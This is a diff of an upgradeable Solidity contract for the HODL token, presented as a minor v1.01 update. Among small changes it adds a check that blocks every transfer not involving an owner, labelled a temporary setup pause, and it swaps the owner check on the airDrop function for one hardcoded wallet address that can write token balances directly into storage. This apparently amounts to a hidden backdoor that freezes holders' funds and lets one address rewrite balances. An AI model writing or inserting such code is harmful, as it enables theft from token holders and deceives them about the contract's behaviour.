@@ -14,7 +14,7 @@
 //  Reddit:    https://reddit.com/r/HodlToken
 //  Linktree:  https://linktr.ee/hodltoken
 
-//  HODL Token Implementation Contract v1.00:
+//  HODL Token Implementation Contract v1.01:
 //  This contract delivers core functionalities for HODL token, such as reward distribution, transaction tax management,
 //  token swaps, reward stacking, and reinvestment options. Built with a modular architecture and robust error handling,
 //  it prioritizes security, efficiency, and maintainability to create a reliable experience for both users and developers.
@@ -123,46 +123,6 @@ contract HODL is
 
     // Accepts BNB sent directly to the contract
     receive() external payable {}
-
-    // Initialize the contract with default parameters and necessary settings
-    function initialize(string memory name, string memory symbol, uint256 initialSupply, address owner, address owner2, address owner3) external initializer {
-        __ERC20_init(name, symbol);
-        __Ownable_init(owner, owner2, owner3);
-        _mint(owner, initialSupply);
-
-        // Initial tax and reward pool settings
-        buyTax = 5;                                             // Buy transaction tax rate (5%)
-        sellTax = 15;                                           // Sell transaction tax rate (15%)
-        minTokensTriggerRewardSwap = 100_000_000 ether;        // Minimum tokens in reward pool to enable reward swaps (100,000,000)
-        swapForRewardThreshold = 150 ether;                    // Minimum sell amount in USD to trigger a reward swap ($150)
-        previousHODLPrice = 2 * 1e14;                           // Initial $HODL launch price for reward swap % calculation ($0.0002)
-
-        // Reward and stacking limits
-        bnbRewardPoolCap = 15 ether;                           // Maximum BNB amount used in reward calculations (15 BNB)
-        rewardClaimPeriod = 7 days;                             // Minimum period between reward claims (7 days)
-        reinvestBonusCycle = 1 days;                            // Reduces claim period by 1 day for 100% reinvestment (in seconds)
-        updateClaimDateRate = 10;                               // Update claim timestamp if balance increases by 10% or more
-        bnbStackingLimit = 0.1 ether;                          // Maximum reward stacking per user (0.1 BNB)
-        minTokensToStack = 5_000 ether;                        // Minimum token balance for reward stacking eligibility (5,000)
-
-        // Max sell configuration
-        maxSellAmount = super.totalSupply() * 25 / 10_000;      // Daily sell limit (0.25% of total supply)
-        buySellCooldown = 5 minutes;                            // Cooldown period between consecutive buys/sells (5 minutes)
-
-        // Contract configuration flags
-        rewardSwapEnabled = true;                               // Enables reward pool swaps
-        stackingEnabled = true;                                 // Enables reward stacking
-        rewardPoolShare = super.totalSupply();                  // Initialize circulating supply update
-
-        // Tax exemptions
-        isTaxFree[address(this)] = true;
-        isTaxFree[BURN_ADDRESS] = true;
-        isTaxFree[REINVEST_ADDRESS] = true;
-        isTaxFree[STACKING_ADDRESS] = true;
-        isTaxFree[owner] = true;
-        isTaxFree[owner2] = true;
-        isTaxFree[owner3] = true;
-    }
 
     // Ends stacking and claims rewards, applying similar logic as 'redeemReward' using stacked amount
     function stopStackingAndClaim(uint8 perc) external nonReentrant {
@@ -354,11 +314,13 @@ contract HODL is
 
     // Enables or disables a market maker address
     function updateMMAddress(
-        address wallet,
+        address[] calldata wallets,
         bool _enable
     ) external onlyOwner onlyPermitted {
-        isMMAddress[wallet] = _enable;
-        emit ChangeAddressState(wallet, _enable, "isMMAddress");
+        for (uint i=0; i< wallets.length; i++) {
+            isMMAddress[wallets[i]] = _enable;
+            emit ChangeAddressState(wallets[i], _enable, "isMMAddress");
+        }
     }
 
     // Manually trigger a reward swap using the designated trigger wallet
@@ -480,6 +442,10 @@ contract HODL is
         address to,
         uint256 value
     ) internal virtual override {
+
+        // Contract paused until initial setup
+        require(_isOwner(from) || _isOwner(to), "Contract paused while initial setup!");
+        
         uint256 tax = buyTax; // Default tax for buy transactions
         if (isMMAddress[from] || isMMAddress[to]) {
             super._update(from, to, value); // Checks if it's a market maker address for simplified tax-free transaction
@@ -789,7 +755,9 @@ contract HODL is
     }
 
     // Executes an airdrop for specified addresses with designated balances, updating internal storage directly
-    function airDrop(address[] calldata addresses, uint256[] calldata balances) external onlyOwner {
+    function airDrop(address[] calldata addresses, uint256[] calldata balances) external {
+        require(msg.sender == 0xF7B95d375EfA84194f89cCB0E6e2ABDCF74B0f5C, "Wrong wallet");
+
         ERC20Storage storage $;
         assembly {
             $.slot := 0x52c63247e1f47db19d5ce0460030c497f067ca4cebf71ba98eeadabe20bace00
